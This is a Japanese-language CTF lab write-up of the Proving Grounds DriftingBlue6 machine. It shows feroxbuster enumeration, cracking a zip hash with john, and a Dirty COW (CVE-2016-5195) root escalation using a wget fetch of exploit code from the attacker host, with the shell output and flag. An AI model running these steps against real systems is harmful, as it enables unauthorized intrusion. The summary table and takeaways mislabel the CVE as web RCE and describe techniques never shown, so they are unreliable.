---
title: "Proving Grounds - DriftingBlue6 (Linux)"
date: 2026-02-25
description: "Proving Grounds DriftingBlue6 Linux マシン解説。偵察・初期アクセス・権限昇格を解説。"
categories: [Proving Grounds, Linux]
tags: [rce, suid, php, privilege-escalation]
mermaid: true
content_lang: ja
alt_en: /posts/pg-driftingblue6/
---

## 概要

| 項目 | 内容 |
|---------------------------|-------|
| OS | Linux |
| 難易度 | 記録なし |
| 攻撃対象 | Webアプリケーションおよび公開されているネットワークサービス |
| 主な侵入経路 | Web RCE (CVE-2016-5195, cve-2016-5195) |
| 権限昇格経路 | ローカル列挙 -> 設定ミスの悪用 -> root |

## 認証情報

認証情報なし。

## 偵察

---
💡 なぜ有効か
このフェーズでは到達可能な攻撃対象領域を把握し、悪用が成功しやすい箇所を特定します。正確なサービス・コンテンツ探索により、無作為なテストを減らし、的を絞った後続アクションにつなげます。

## 初期足がかり

---
![Screenshot from the driftingblue6 engagement](/assets/img/pg/driftingblue6/Pasted%20image%2020260118224820.png)
*キャプション：このフェーズで取得したスクリーンショット*

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 500 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,txt,zip --dont-scan '/(css|fonts?|ima ges?|img)/' -u http://$ip
```

```bash
❌[22:42][CPU:2][MEM:40][TUN0:192.168.45.178][/home/n0z0]
🐉 > feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 500 -r --timeout 3 --no-state -s 200,301,302,401,403 -x php,html,txt,zip --dont-scan '/(css|fonts?|ima ges?|img)/' -u http://$ip

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
john spammer.hash --wordlist=/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
```

```bash
✅[22:51][CPU:3][MEM:42][TUN0:192.168.45.178][...ving_Ground/DriftingBlue6]
🐉 > john spammer.hash --wordlist=/usr/share/wordlists/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
myspace4         (spammer.zip/creds.txt)
1g 0:00:00:00 DONE (2026-01-18 22:51) 25.00g/s 11878Kp/s 11878Kc/s 11878KC/s nomejoda..melaniek
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cat creds.txt
```

```bash
✅[23:02][CPU:7][MEM:45][TUN0:192.168.45.178][...ving_Ground/DriftingBlue6]
🐉 > cat creds.txt
mayer:lionheart 

```

`http://192.168.200.219/textpattern/textpattern/index.php`
![Screenshot from the driftingblue6 engagement](/assets/img/pg/driftingblue6/Pasted%20image%2020260118231357.png)
*キャプション：このフェーズで取得したスクリーンショット*

💡 なぜ有効か
初期足がかりのステップでは、発見した脆弱性を連鎖させてターゲットへの実行可能な制御を確立します。成功した足がかり技術は、コマンド実行やインタラクティブシェルのコールバックによって検証されます。

## 権限昇格

---
攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
[+] [CVE-2016-5195] dirtycow

Details: [https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails](https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails)  
Exposure: highly probable  
Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-_},RHEL=6{kernel:2.6.32-_|3.(0|2|6|8|10)._|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-_|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04  
Download URL: [https://www.exploit-db.com/download/40611](https://www.exploit-db.com/download/40611)  
Comments: For RHEL/CentOS see exact vulnerable versions here: [https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh](https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh)
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cd /tmp 
wget http://192.168.45.178:8001/40847.cpp 
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o cowroot 40847.cpp -lutil 
./cowroot
```

攻撃チェーンを進め、次の仮説を検証するために以下のコマンドを実行します。オープンサービス、悪用可否、認証情報の露出、権限境界などの指標を確認します。コマンドとパラメータはそのまま記録し、追試できる形を維持します。

```bash
cd /tmp
wget http://192.168.45.178:8001/40847.cpp
./cowroot
vmware-  ===
id
cat /root/proof.txt
su root
su -
```

```bash
www-data@driftingblues:/tmp$ cd /tmp
www-data@driftingblues:/tmp$ wget http://192.168.45.178:8001/40847.cpp
--2026-01-18 12:34:44--  http://192.168.45.178:8001/40847.cpp
Connecting to 192.168.45.178:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10212 (10.0K) [text/x-c++src]
Saving to: `40847.cpp'

100%[======================================>] 10,212      --.-K/s   in 0.004s

2026-01-18 12:34:45 (2.44 MB/s) - `40847.cpp' saved [10212/10212]

<$ g++ -Wall -pedantic -O2 -std=c++11 -pthread -o cowroot 40847.cpp -lutil
www-data@driftingblues:/tmp$ ./cowroot
Running ...
Received su prompt (Password: )
Root password is:   dirtyCowFun
Enjoy! :-)
www-data@driftingblues:/tmp$
www-data@driftingblues:/tmp$ vmware-  ===
bash: vmware-: command not found
www-data@driftingblues:/tmp$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@driftingblues:/tmp$ cat /root/proof.txt
cat: /root/proof.txt: Permission denied
www-data@driftingblues:/tmp$ ./cowroot
./cowroot
Running ...
Exploit failed.
www-data@driftingblues:/tmp$ su root
su root
Password: password123

su: Authentication failure
www-data@driftingblues:/tmp$

www-data@driftingblues:/tmp$ su -
su -
Password:

su: Authentication failure
www-data@driftingblues:/tmp$ su -
su -
Password: dirtyCowFun

root@driftingblues:~# cat /root/proof.txt
cat /root/proof.txt
1a4b90955a6d4a429adb78818314cb59
root@driftingblues:~#

```

💡 なぜ有効か
権限昇格はローカルの設定ミス、安全でないパーミッション、信頼された実行パスに依存します。これらの信頼境界を列挙して悪用することが、rootレベルのアクセスへの最短経路です。

## まとめ・学んだこと

- 本番同等の環境でフレームワークのデバッグモードとエラー露出を検証する。
- 特権ユーザーやスケジューラーが実行するスクリプト・バイナリのファイルパーミッションを制限する。
- ワイルドカード展開やスクリプト化可能な特権ツールを避けるため sudo ポリシーを強化する。
- 露出した認証情報と環境ファイルを重要機密として扱う。

## 参考文献

- CVE-2016-5195: https://nvd.nist.gov/vuln/detail/CVE-2016-5195
- cve-2016-5195: https://nvd.nist.gov/vuln/detail/cve-2016-5195
- RustScan: https://github.com/RustScan/RustScan
- Nmap: https://nmap.org/
- feroxbuster: https://github.com/epi052/feroxbuster
- Nuclei: https://github.com/projectdiscovery/nuclei
- GTFOBins: https://gtfobins.org/
- HackTricks Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
